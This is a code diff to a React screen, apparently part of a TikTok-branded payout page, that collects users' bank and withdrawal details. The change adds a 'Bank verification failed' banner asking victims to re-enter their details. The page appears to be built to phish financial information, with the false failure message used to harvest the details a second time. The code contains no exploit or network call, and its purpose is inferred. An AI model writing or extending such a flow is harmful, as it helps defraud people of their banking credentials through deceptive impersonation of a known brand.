@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { ShieldCheck, ChevronRight, Building2, Wallet, DollarSign, Smartphone, Mail, Globe } from "lucide-react";
+import { ShieldCheck, ChevronRight, Building2, Wallet, DollarSign, Smartphone, Mail, Globe, AlertCircle } from "lucide-react";
 import {
   Select,
   SelectContent,
@@ -14,6 +14,7 @@ import TikTokHeader from "./TikTokHeader";
 interface BankDetailsScreenProps {
   userName: string;
   onSubmit: (method: string, details: Record<string, string>) => void;
+  isReverification?: boolean;
 }
 
 const WITHDRAWAL_METHODS = [
@@ -36,7 +37,7 @@ const US_BANKS = [
 
 type Step = "method" | "form" | "confirm";
 
-const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
+const BankDetailsScreen = ({ userName, onSubmit, isReverification = false }: BankDetailsScreenProps) => {
   const [step, setStep] = useState<Step>("method");
   const [selectedMethod, setSelectedMethod] = useState("");
   const [details, setDetails] = useState<Record<string, string>>({});
@@ -91,6 +92,18 @@ const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
           <p className="text-sm text-muted-foreground mb-5">
             Choose how you'd like to receive your funds.
           </p>
+
+          {isReverification && (
+            <div className="flex items-start gap-2.5 p-3.5 rounded-xl bg-destructive/5 border border-destructive/20 mb-5">
+              <AlertCircle className="w-4 h-4 text-destructive shrink-0 mt-0.5" />
+              <div>
+                <p className="text-xs font-semibold text-destructive">Bank verification failed</p>
+                <p className="text-xs text-muted-foreground mt-0.5">
+                  Your previous bank details couldn&apos;t be verified. Please re-enter your withdrawal information to restart the process.
+                </p>
+              </div>
+            </div>
+          )}
 
           <div className="rounded-2xl border border-border bg-card overflow-hidden">
             {WITHDRAWAL_METHODS.map((m, i) => {
